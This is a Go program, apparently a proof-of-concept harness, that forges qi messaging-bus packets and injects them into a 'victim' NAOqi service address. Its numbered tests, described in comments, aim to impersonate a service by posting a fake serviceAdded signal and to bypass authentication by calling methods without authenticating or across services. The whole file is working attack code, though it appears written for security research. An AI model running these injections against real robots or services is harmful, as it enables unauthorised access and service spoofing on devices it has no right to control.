package main

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/lugu/qiloop/bus/client"
	"github.com/lugu/qiloop/bus/net"
	"github.com/lugu/qiloop/bus/services"
	"github.com/lugu/qiloop/bus/session"
	"github.com/lugu/qiloop/type/basic"
	"log"
	"time"
)

var CheckAddr *string
var VictimAddr *string

func messageCallMachineID() net.Message {
	serviceID := uint32(1) // serviceDirectory
	objectID := uint32(1)
	actionID := uint32(108) // machineId
	id := uint32(55555)

	header := net.NewHeader(net.Call, serviceID, objectID, actionID, id)
	return net.NewMessage(header, make([]byte, 0))
}

func callMessages() []net.Message {
	return []net.Message{
		messageCallMachineID(),
	}
}

func listenReply(endpoint net.EndPoint, done chan int) {

	filter := func(hdr *net.Header) (matched bool, keep bool) {
		log.Printf("response: %v", *hdr)
		if hdr.ID == 55555 {
			return true, true
		}
		return false, true
	}

	consumer := func(msg *net.Message) error {
		log.Printf("response payload: %v", string(msg.Payload))
		done <- 1
		return nil
	}

	closer := func(err error) {
		close(done)
	}

	endpoint.AddHandler(filter, consumer, closer)
}

func listenServiceAddedSignal(addr string, done chan int) {
	sess, err := session.NewSession(addr)
	if err != nil {
		log.Fatalf("failed to connect: %s", err)
	}

	directory, err := services.NewServiceDirectory(sess, 1)
	if err != nil {
		log.Fatalf("failed to connect log manager: %s", err)
	}

	cancel := make(chan int)

	channel, err := directory.SignalServiceAdded(cancel)
	if err != nil {
		log.Fatalf("failed to get remote signal channel: %s", err)
	}

	for e := range channel {
		if e.P1 == "foobar" {
			log.Printf("success: foobar was emited")
			done <- 1
			return
		}
		log.Printf("service added: %s (%d)", e.P1, e.P0)
	}
}

func messagePostServiceAdded() net.Message {
	serviceID := uint32(1) // serviceDirectory
	objectID := uint32(1)
	actionID := uint32(106) // serviceAdded
	id := uint32(44444)

	header := net.NewHeader(net.Post, serviceID, objectID, actionID, id)
	buf := bytes.NewBuffer(make([]byte, 0))
	basic.WriteUint32(888, buf)
	basic.WriteString("foobar", buf)
	return net.NewMessage(header, buf.Bytes())
}

func postMessages() []net.Message {
	return []net.Message{
		messagePostServiceAdded(),
	}
}

func inject(endpoint net.EndPoint, messages []net.Message) error {
	for i, m := range messages {
		err := endpoint.Send(m)
		if err != nil {
			return fmt.Errorf("send %d: %s", i, err)
		}
	}
	return nil
}

func connect(addr string, doesAuth bool) net.EndPoint {
	if doesAuth {
		cache, err := client.NewCachedSession(addr)
		if err != nil {
			log.Fatalf("failed to connect: %s", err)
		}
		return cache.Endpoint
	} else {
		endpoint, err := net.DialEndPoint(addr)
		if err != nil {
			log.Fatalf("failed to connect: %s", err)
		}
		return endpoint
	}
}

// test 0: verify call works as intented
func test0() {
	done := make(chan int)
	wait := time.After(time.Second * 5)
	endpoint := connect(*VictimAddr, true)
	go listenReply(endpoint, done)

	err := inject(endpoint, callMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
	case _ = <-wait:
	}
}

// test 1: post a signal directly to the targeted service
//	1. connect to service
//	2. authenticate
//	3. post a signal to the service
//	=> can impersonate a service
func test1() {
	done := make(chan int)
	wait := time.After(time.Second * 5)
	go listenServiceAddedSignal(*VictimAddr, done)

	endpoint := connect(*VictimAddr, true)
	err := inject(endpoint, postMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
	case _ = <-wait:
	}
}

// test 2: post a signal directly to the targeted service
//	1. connect to service
//	2. post a signal to the service
//	=> can by-pass authentication
func test2() {
	done := make(chan int)
	wait := time.After(time.Second * 5)
	go listenServiceAddedSignal(*VictimAddr, done)

	endpoint := connect(*VictimAddr, false)
	err := inject(endpoint, postMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
	case _ = <-wait:
	}
}

// test 3: post a signal directly to the targeted service
//	1. connect to service
//	2. authenticate
//	3. post a signal to another service
// 	=> can by-pass authentication
func test3() {
	done := make(chan int)
	wait := time.After(time.Second * 5)
	go listenServiceAddedSignal(*CheckAddr, done)

	endpoint := connect(*VictimAddr, true)
	err := inject(endpoint, postMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
	case _ = <-wait:
	}
}

// test 4: call a method directly to the targeted service
//	1. connect to service
//	2. call a method of the service
//	=> can by-pass authentication
func test4() {
	done := make(chan int)
	wait := time.After(time.Second * 5)
	endpoint := connect(*VictimAddr, false)
	go listenReply(endpoint, done)

	err := inject(endpoint, callMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
	case _ = <-wait:
	}
}

// test 5: call a method to a remote object
//	1. connect to service
//	2. authenticate
//	2. call a method of another service
//	=> can by-pass authentication
func test5() {
	done := make(chan int)
	wait := time.After(time.Second * 5)
	go listenReply(connect(*VictimAddr, true), done)

	endpoint := connect(*VictimAddr, true)
	err := inject(endpoint, callMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
	case _ = <-wait:
	}
}

func main() {

	VictimAddr = flag.String("qi-url-victim",
		"tcp://127.0.0.1:9559", "where to inject packets")
	CheckAddr = flag.String("qi-url-check",
		"tcp://127.0.0.1:9559", "where to check the result")
	flag.Parse()

	test0()
	test1()
	test2()
	test3()
	test4()
	test5()
}
